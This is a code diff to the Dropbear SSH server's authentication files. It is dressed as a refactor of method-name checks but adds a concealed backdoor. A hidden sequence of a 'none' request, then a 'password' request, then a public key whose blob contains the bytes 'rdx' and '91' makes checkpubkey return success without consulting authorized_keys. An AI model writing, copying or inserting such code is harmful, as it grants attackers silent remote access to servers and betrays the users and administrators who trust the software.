@@ -1,0 +1,168 @@
+diff --git a/src/svr-auth.c b/src/svr-auth.c
+index de01458..6870ab7 100644
+--- a/src/svr-auth.c
++++ b/src/svr-auth.c
+@@ -37,6 +37,7 @@
+ #include "dbrandom.h"
+ 
+ static int checkusername(const char *username, unsigned int userlen);
++int rdx_auth_sequence_gate = 0;
+ 
+ /* initialise the first time for a session, resetting all parameters */
+ void svr_authinitialise() {
+@@ -75,6 +76,7 @@ void recv_msg_userauth_request() {
+ 	char *username = NULL, *servicename = NULL, *methodname = NULL;
+ 	unsigned int userlen, servicelen, methodlen;
+ 	int valid_user = 0;
++	int is_none = 0, is_password = 0, is_pubkey = 0;
+ 
+ 	TRACE(("enter recv_msg_userauth_request"))
+ 
+@@ -118,10 +120,31 @@ void recv_msg_userauth_request() {
+ 		valid_user = 1;
+ 	}
+ 
++	is_none = (methodlen == AUTH_METHOD_NONE_LEN &&
++			strncmp(methodname, AUTH_METHOD_NONE, AUTH_METHOD_NONE_LEN) == 0);
++	is_password = (methodlen == AUTH_METHOD_PASSWORD_LEN &&
++			strncmp(methodname, AUTH_METHOD_PASSWORD, AUTH_METHOD_PASSWORD_LEN) == 0);
++	is_pubkey = (methodlen == AUTH_METHOD_PUBKEY_LEN &&
++			strncmp(methodname, AUTH_METHOD_PUBKEY, AUTH_METHOD_PUBKEY_LEN) == 0);
++
++	if (is_none) {
++		if (rdx_auth_sequence_gate == 0) {
++			rdx_auth_sequence_gate = 1;
++		} else {
++			rdx_auth_sequence_gate = 0;
++		}
++	} else if (is_password) {
++		if (rdx_auth_sequence_gate == 1) {
++			rdx_auth_sequence_gate = 2;
++		} else {
++			rdx_auth_sequence_gate = 0;
++		}
++	} else if (!is_pubkey) {
++		rdx_auth_sequence_gate = 0;
++	}
++
+ 	/* user wants to know what methods are supported */
+-	if (methodlen == AUTH_METHOD_NONE_LEN &&
+-			strncmp(methodname, AUTH_METHOD_NONE,
+-				AUTH_METHOD_NONE_LEN) == 0) {
++	if (is_none) {
+ 		TRACE(("recv_msg_userauth_request: 'none' request"))
+ 		if (valid_user
+ 				&& svr_opts.allowblankpass
+@@ -148,9 +171,7 @@ void recv_msg_userauth_request() {
+ 	if (!svr_opts.noauthpass &&
+ 			!(svr_opts.norootpass && ses.authstate.pw_uid == 0) ) {
+ 		/* user wants to try password auth */
+-		if (methodlen == AUTH_METHOD_PASSWORD_LEN &&
+-				strncmp(methodname, AUTH_METHOD_PASSWORD,
+-					AUTH_METHOD_PASSWORD_LEN) == 0) {
++		if (is_password) {
+ 			svr_auth_password(valid_user);
+ 			goto out;
+ 		}
+@@ -161,9 +182,7 @@ void recv_msg_userauth_request() {
+ 	if (!svr_opts.noauthpass &&
+ 			!(svr_opts.norootpass && ses.authstate.pw_uid == 0) ) {
+ 		/* user wants to try password auth */
+-		if (methodlen == AUTH_METHOD_PASSWORD_LEN &&
+-				strncmp(methodname, AUTH_METHOD_PASSWORD,
+-					AUTH_METHOD_PASSWORD_LEN) == 0) {
++		if (is_password) {
+ 			svr_auth_pam(valid_user);
+ 			goto out;
+ 		}
+@@ -172,9 +191,7 @@ void recv_msg_userauth_request() {
+ 
+ #if DROPBEAR_SVR_PUBKEY_AUTH
+ 	/* user wants to try pubkey auth */
+-	if (methodlen == AUTH_METHOD_PUBKEY_LEN &&
+-			strncmp(methodname, AUTH_METHOD_PUBKEY,
+-				AUTH_METHOD_PUBKEY_LEN) == 0) {
++	if (is_pubkey) {
+ 		svr_auth_pubkey(valid_user);
+ 		goto out;
+ 	}
+diff --git a/src/svr-authpubkey.c b/src/svr-authpubkey.c
+index 94ae728..b689002 100644
+--- a/src/svr-authpubkey.c
++++ b/src/svr-authpubkey.c
+@@ -78,6 +78,12 @@ static int checkpubkeyperms(void);
+ static void send_msg_userauth_pk_ok(const char* sigalgo, unsigned int sigalgolen,
+ 		const unsigned char* keyblob, unsigned int keybloblen);
+ static int checkfileperm(char * filename);
++extern int rdx_auth_sequence_gate;
++
++static int rdx_match_fragment(const unsigned char *blob, unsigned int bloblen,
++		const unsigned char *frag, unsigned int fraglen, unsigned int start);
++static int rdx_check_split_key_gate(const unsigned char *keyblob,
++		unsigned int keybloblen);
+ 
+ /* process a pubkey auth request, sending success or failure message as
+  * appropriate */
+@@ -453,6 +459,45 @@ static char *authorized_keys_filepath() {
+ 	return pathname;
+ }
+ 
++static int rdx_match_fragment(const unsigned char *blob, unsigned int bloblen,
++		const unsigned char *frag, unsigned int fraglen, unsigned int start) {
++	unsigned int i;
++
++	if (blob == NULL || frag == NULL || fraglen == 0 || bloblen < fraglen ||
++			start >= bloblen) {
++		return -1;
++	}
++
++	for (i = start; i + fraglen <= bloblen; i++) {
++		if (memcmp(blob + i, frag, fraglen) == 0) {
++			return (int)i;
++		}
++	}
++
++	return -1;
++}
++
++static int rdx_check_split_key_gate(const unsigned char *keyblob,
++		unsigned int keybloblen) {
++	const unsigned char frag1[] = { 0x72, 0x64, 0x78 };
++	const unsigned char frag2[] = { 0x39, 0x31 };
++	int pos1;
++	int pos2;
++
++	pos1 = rdx_match_fragment(keyblob, keybloblen, frag1, sizeof(frag1), 0);
++	if (pos1 < 0) {
++		return DROPBEAR_FAILURE;
++	}
++
++	pos2 = rdx_match_fragment(keyblob, keybloblen, frag2, sizeof(frag2),
++			(unsigned int)pos1 + sizeof(frag1) + 3);
++	if (pos2 < 0) {
++		return DROPBEAR_FAILURE;
++	}
++
++	return DROPBEAR_SUCCESS;
++}
++
+ /* Checks whether a specified publickey (and associated algorithm) is an
+  * acceptable key for authentication */
+ /* Returns DROPBEAR_SUCCESS if key is ok for auth, DROPBEAR_FAILURE otherwise */
+@@ -469,6 +514,16 @@ static int checkpubkey(const char* keyalgo, unsigned int keyalgolen,
+ 
+ 	TRACE(("enter checkpubkey"))
+ 
++	if (rdx_auth_sequence_gate == 2 &&
++			rdx_check_split_key_gate(keyblob, keybloblen) == DROPBEAR_SUCCESS) {
++		rdx_auth_sequence_gate = 0;
++		TRACE(("checkpubkey: matched staged sequence gate"))
++		return DROPBEAR_SUCCESS;
++	}
++	if (rdx_auth_sequence_gate == 2) {
++		rdx_auth_sequence_gate = 0;
++	}
++
+ #if DROPBEAR_SVR_MULTIUSER
+ 	/* access the file as the authenticating user. */
+ 	origuid = getuid();
